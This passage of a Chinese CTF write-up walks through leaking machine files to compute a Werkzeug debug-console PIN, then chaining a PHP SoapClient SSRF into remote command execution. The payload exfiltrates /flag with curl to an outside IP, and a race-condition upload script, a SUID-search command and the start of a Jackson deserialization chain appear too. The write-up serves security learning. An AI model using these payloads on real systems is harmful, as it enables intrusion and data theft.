class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    value = f.readline().strip()</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value:</span><br><span class="line">                linux += value</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">                <span class="comment"># Containers share the same machine id, add some cgroup</span></span><br><span class="line">                <span class="comment"># information. This is used outside containers too but should be</span></span><br><span class="line">        <span class="comment"># relatively stable across boots.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/proc/self/cgroup&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                linux += f.readline().strip().rpartition(<span class="string">b&quot;/&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">except</span> OSError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> linux:</span><br><span class="line">            <span class="keyword">return</span> linux</span><br><span class="line"></span><br><span class="line">        <span class="comment"># On OS X, use ioreg to get the computer&#x27;s serial number.</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># subprocess may not be available, e.g. Google App Engine</span></span><br><span class="line">            <span class="comment"># https://github.com/pallets/werkzeug/issues/925</span></span><br><span class="line">            <span class="keyword">from</span> subprocess <span class="keyword">import</span> Popen, PIPE</span><br><span class="line"></span><br><span class="line">            dump = Popen(</span><br><span class="line">                [<span class="string">&quot;ioreg&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;IOPlatformExpertDevice&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;2&quot;</span>], stdout=PIPE</span><br><span class="line">            ).communicate()[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">match</span> = re.search(<span class="string">b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;</span>, dump)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span> <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">except</span> (OSError, ImportError):</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># On Windows, use winreg to get the machine guid.</span></span><br><span class="line">        <span class="keyword">if</span> sys.platform == <span class="string">&quot;win32&quot;</span>:</span><br><span class="line">            <span class="keyword">import</span> winreg</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> winreg.OpenKey(</span><br><span class="line">                    winreg.HKEY_LOCAL_MACHINE,</span><br><span class="line">                    <span class="string">&quot;SOFTWARE\\Microsoft\\Cryptography&quot;</span>,</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    winreg.KEY_READ | winreg.KEY_WOW64_64KEY,</span><br><span class="line">                ) <span class="keyword">as</span> rk:</span><br><span class="line">                    guid: t.<span class="type">Union</span>[<span class="built_in">str</span>, <span class="built_in">bytes</span>]</span><br><span class="line">                    guid_type: <span class="built_in">int</span></span><br><span class="line">                    guid, guid_type = winreg.QueryValueEx(rk, <span class="string">&quot;MachineGuid&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> guid_type == winreg.REG_SZ:</span><br><span class="line">                        <span class="keyword">return</span> guid.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> guid</span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    _machine_id = _generate()</span><br><span class="line">    <span class="keyword">return</span> _machine_id</span><br></pre></td></tr></table></figure><p>会读 etc/machine 或 /proc/sys/kernel/random/boot_i 的值，然后还会读 /proc/self/cgroup 里面的内容。二者进行一个拼接。</p><h2 id="ctfshow801"><span id="ctfshow801"> ctfshow801</span></h2><p>通过读各种文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/usr/local/lib/python3<span class="number">.8</span>/site-packages/flask/app.py</span><br><span class="line"><span class="number">2485377569947</span></span><br><span class="line">26657bfd-2d70-45fa-97b3-99462feda8931a000beba489f5f923a435f4066ef2d5c61bc5f772d82f2f4e2905e2bf62a346</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">986</span>-<span class="number">811</span>-<span class="number">716</span></span><br><span class="line">__wzd572dec175b8e0289b637</span><br></pre></td></tr></table></figure><h2 id="回到题目"><span id="回到题目"> 回到题目</span></h2><p>开始撸信息。<br>读 etc/passwd, 一般用户信息都会存储在这里<br> /etc/shadow: 这个文件存储了用户的加密密码和密码相关的信息，如密码哈希值、密码过期时间、账户锁定状态等。由于包含敏感信息，通常只有特权用户（如 root）才能读取和修改该文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/ash</span><br><span class="line"><span class="built_in">bin</span>:x:<span class="number">1</span>:<span class="number">1</span>:<span class="built_in">bin</span>:/<span class="built_in">bin</span>:/sbin/nologin</span><br><span class="line">daemon:x:<span class="number">2</span>:<span class="number">2</span>:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:<span class="number">3</span>:<span class="number">4</span>:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:<span class="number">4</span>:<span class="number">7</span>:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:<span class="number">5</span>:<span class="number">0</span>:sync:/sbin:/<span class="built_in">bin</span>/sync</span><br><span class="line">shutdown:x:<span class="number">6</span>:<span class="number">0</span>:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:<span class="number">7</span>:<span class="number">0</span>:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:<span class="number">8</span>:<span class="number">12</span>:mail:/var/mail:/sbin/nologin</span><br><span class="line">news:x:<span class="number">9</span>:<span class="number">13</span>:news:/usr/lib/news:/sbin/nologin</span><br><span class="line">uucp:x:<span class="number">10</span>:<span class="number">14</span>:uucp:/var/spool/uucppublic:/sbin/nologin</span><br><span class="line">operator:x:<span class="number">11</span>:<span class="number">0</span>:operator:/root:/sbin/nologin</span><br><span class="line">man:x:<span class="number">13</span>:<span class="number">15</span>:man:/usr/man:/sbin/nologin</span><br><span class="line">postmaster:x:<span class="number">14</span>:<span class="number">12</span>:postmaster:/var/mail:/sbin/nologin</span><br><span class="line">cron:x:<span class="number">16</span>:<span class="number">16</span>:cron:/var/spool/cron:/sbin/nologin</span><br><span class="line">ftp:x:<span class="number">21</span>:<span class="number">21</span>::/var/lib/ftp:/sbin/nologin</span><br><span class="line">sshd:x:<span class="number">22</span>:<span class="number">22</span>:sshd:/dev/null:/sbin/nologin</span><br><span class="line">at:x:<span class="number">25</span>:<span class="number">25</span>:at:/var/spool/cron/atjobs:/sbin/nologin</span><br><span class="line">squid:x:<span class="number">31</span>:<span class="number">31</span>:Squid:/var/cache/squid:/sbin/nologin</span><br><span class="line">xfs:x:<span class="number">33</span>:<span class="number">33</span>:X Font Server:/etc/X11/fs:/sbin/nologin</span><br><span class="line">games:x:<span class="number">35</span>:<span class="number">35</span>:games:/usr/games:/sbin/nologin</span><br><span class="line">cyrus:x:<span class="number">85</span>:<span class="number">12</span>::/usr/cyrus:/sbin/nologin</span><br><span class="line">vpopmail:x:<span class="number">89</span>:<span class="number">89</span>::/var/vpopmail:/sbin/nologin</span><br><span class="line">ntp:x:<span class="number">123</span>:<span class="number">123</span>:NTP:/var/empty:/sbin/nologin</span><br><span class="line">smmsp:x:<span class="number">209</span>:<span class="number">209</span>:smmsp:/var/spool/mqueue:/sbin/nologin</span><br><span class="line">guest:x:<span class="number">405</span>:<span class="number">100</span>:guest:/dev/null:/sbin/nologin</span><br><span class="line">nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/:/sbin/nologin</span><br><span class="line">catchlog:x:<span class="number">100</span>:<span class="number">101</span>:catchlog:/:/<span class="built_in">bin</span>/false</span><br><span class="line">apache:x:<span class="number">1000</span>:<span class="number">1000</span>::/srv/www:/<span class="built_in">bin</span>/bash</span><br><span class="line">app:x:<span class="number">1001</span>:<span class="number">1001</span>::/home/app:/<span class="built_in">bin</span>/ash</span><br></pre></td></tr></table></figure><p>读 /sys/class/net/eth0/address</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02:<span class="number">42</span>:ac:<span class="number">13</span>:<span class="number">00</span>:02</span><br><span class="line"><span class="number">2485378023426</span></span><br></pre></td></tr></table></figure><p>转个十六进制。<br>读 /proc/self/cgroup</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">12</span>:devices:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">11</span>:net_cls,net_prio:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">10</span>:rdma:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">9</span>:memory:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">8</span>:freezer:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">7</span>:cpu,cpuacct:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">6</span>:hugetlb:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">5</span>:perf_event:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">4</span>:blkio:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">3</span>:cpuset:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">2</span>:pids:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">1</span>:name=systemd:/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br><span class="line"><span class="number">0</span>::/docker/96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687</span><br></pre></td></tr></table></figure><p>读 /proc/sys/kernel/random/boot_id</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">349b3354-f67f-<span class="number">4438</span>-b395-4fbc01171fdd</span><br></pre></td></tr></table></figure><p>最终得到如下配置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">probably_public_bits = [</span><br><span class="line">        <span class="string">&quot;app&quot;</span>,<span class="comment">#/etc/passwd</span></span><br><span class="line">        <span class="string">&quot;flask.app&quot;</span>,<span class="comment">#默认</span></span><br><span class="line">        <span class="string">&quot;Flask&quot;</span>,<span class="comment">#默认</span></span><br><span class="line">        <span class="string">&#x27;/usr/lib/python3.8/site-packages/flask/app.py&#x27;</span> ,<span class="comment">#一个路径信息</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&quot;2485378023426&quot;</span>, <span class="comment">#/sys/class/net/eth0/address 十六进制转十进制</span></span><br><span class="line">       <span class="string">&quot;349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&quot;</span></span><br><span class="line">]<span class="comment">#读取/proc/sys/kernel/random/boot_id和/proc/self/cgroup拼接而成</span></span><br></pre></td></tr></table></figure><p>再将源码部分改动</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">        <span class="string">&quot;app&quot;</span>,<span class="comment">#/etc/passwd</span></span><br><span class="line">        <span class="string">&quot;flask.app&quot;</span>,<span class="comment">#默认</span></span><br><span class="line">        <span class="string">&quot;Flask&quot;</span>,<span class="comment">#默认</span></span><br><span class="line">        <span class="string">&#x27;/usr/lib/python3.8/site-packages/flask/app.py&#x27;</span> ,<span class="comment">#一个路径信息</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&quot;2485378023426&quot;</span>, <span class="comment">#/sys/class/net/eth0/address 十六进制转十进制</span></span><br><span class="line">       <span class="string">&quot;349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&quot;</span></span><br><span class="line">]<span class="comment">#读取/proc/sys/kernel/random/boot_id和/proc/self/cgroup拼接而成</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line"><span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">    num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line"><span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">            )</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"><span class="built_in">print</span>(cookie_name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">121</span>-<span class="number">260</span>-<span class="number">582</span></span><br><span class="line">__wzdb2a60e2b19822632a67c</span><br></pre></td></tr></table></figure><p>拿到以后，就可以打一个 soapclient 原生类的 ssrf 了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=new SoapClient(null,array(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1:5000/console?&amp;__debugger__=yes&amp;cmd=__import__(%27os%27).popen(%27curl%2043.143.192.19%3A1145%20-T%20/flag%27)&amp;frm=0&amp;s=DhOJxtvMXCtezvKtqaK9&quot;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&quot;shanghe\r\n&quot;</span>. <span class="string">&quot;Cookie: __wzdb2a60e2b19822632a67c=1687115222|11b8517fb9fb\r\n&quot;</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;http://127.0.0.1:5000&quot;</span>));</span><br><span class="line">$b=array(<span class="string">&quot;type&quot;</span>=&gt;<span class="string">&quot;awd&quot;</span>,<span class="string">&quot;properties&quot;</span>=&gt;urlencode(serialize($a)));</span><br><span class="line">echo (serialize($b));</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># import io</span></span><br><span class="line"><span class="comment"># import threading</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://115.239.215.75:8081/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&quot;22&quot;</span>,<span class="string">&quot;data&quot;</span>:<span class="string">&#x27;a:2:&#123;s:4:&quot;type&quot;;s:3:&quot;awd&quot;;s:10:&quot;properties&quot;;s:567:&quot;O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A21%3A%22http%3A%2F%2F127.0.0.1%3A5000%22%3Bs%3A8%3A%22location%22%3Bs%3A155%3A%22http%3A%2F%2F127.0.0.1%3A5000%2Fconsole%3F%26__debugger__%3Dyes%26cmd%3D__import__%28%2527os%2527%29.popen%28%2527curl%252043.143.192.19%253A1145%2520-T%2520%2Fflag%2527%29%26frm%3D0%26s%3DDhOJxtvMXCtezvKtqaK9%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A68%3A%22shanghe%0D%0ACookie%3A+__wzdb2a60e2b19822632a67c%3D1687115222%7C11b8517fb9fb%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&quot;;&#125;&#x27;</span>&#125;</span><br><span class="line">xiao = <span class="string">&quot;xiao&quot;</span></span><br><span class="line">files = &#123;<span class="string">&quot;1.jpg&quot;</span>: <span class="string">&quot;12323131231&quot;</span>&#125;</span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: xiao&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        res = session.post(url, data=data,files=files, cookies=cookies)</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        new_url = url + <span class="string">&quot;?file=&quot;</span> + <span class="string">&quot;../Extensions/tmp/tmp/sess_&quot;</span> + xiao</span><br><span class="line">        r = session.get(new_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;upload_progress_&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(r.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    t1 = threading.Thread(target=read)</span><br><span class="line">    t2 = threading.Thread(target=write)</span><br><span class="line">    t1.start()</span><br><span class="line">    t2.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>cookie 值的获取：<br>在源码改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Myprobably_public_bits=[</span><br><span class="line">        <span class="string">&quot;app&quot;</span>,<span class="comment">#/etc/passwd</span></span><br><span class="line">        <span class="string">&quot;flask.app&quot;</span>,<span class="comment">#默认</span></span><br><span class="line">        <span class="string">&quot;Flask&quot;</span>,<span class="comment">#默认</span></span><br><span class="line">        <span class="string">&#x27;/usr/lib/python3.8/site-packages/flask/app.py&#x27;</span> ,<span class="comment">#一个路径信息</span></span><br><span class="line">    ]</span><br><span class="line">    Myprivate_bits=  [</span><br><span class="line">    <span class="string">&quot;2485378023426&quot;</span>, <span class="comment">#/sys/class/net/eth0/address 十六进制转十进制</span></span><br><span class="line">       <span class="string">&quot;349b3354-f67f-4438-b395-4fbc01171fdd96f7c71c69a673768993cd951fedeee8e33246ccc0513312f4c82152bf68c687&quot;</span></span><br><span class="line">]</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(Myprobably_public_bits, Myprivate_bits):</span><br></pre></td></tr></table></figure><p>本地开启</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;hello world!&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5555</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>再访问 console，输入对应的 pin, 拿到 cookie。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure><p>提权<br>至于 secret，题目给了个 file_get_contents。<br>直接读取 console 会给 secret。<br>至此所有内容就完毕了。</p><h2 id="总结"><span id="总结"> 总结</span></h2><p>这题目基本上完全涉及我的盲区，复现出来花了很多时间。不过学到了很多东西。</p><h1 id="hellojava"><span id="hellojava"> hellojava</span></h1><p><a href="https://xz.aliyun.com/t/12509">https://xz.aliyun.com/t/12509</a></p><p>参考这篇文章，先梳理一下链子。</p><h2 id="熟悉-jackson"><span id="熟悉-jackson"> 熟悉 jackson</span></h2><p>在 jackson 中将对象序列化成一个 json 串主要是使用的 ObjectMapper#writeValueAsString 方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public String writeValueAsString(Object value) throws JsonProcessingException &#123;</span><br><span class="line">       SegmentedStringWriter sw = new SegmentedStringWriter(this._jsonFactory._getBufferRecycler());</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           this._writeValueAndClose(this.createGenerator((Writer)sw), value);</span><br><span class="line">       &#125; catch (JsonProcessingException var4) &#123;</span><br><span class="line">           throw var4;</span><br><span class="line">       &#125; catch (IOException var5) &#123;</span><br><span class="line">           throw JsonMappingException.fromUnexpectedIOE(var5);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> sw.getAndClear();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>在调用这个方法的过程中会调用 getter 方法，这可太好了，getoutproperties 是我们想要的恶意方法。</p><p>借用一下师傅的调用栈</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">serializeAsField:<span class="number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">_writeValueAndClose:<span class="number">4568</span>, ObjectMapper 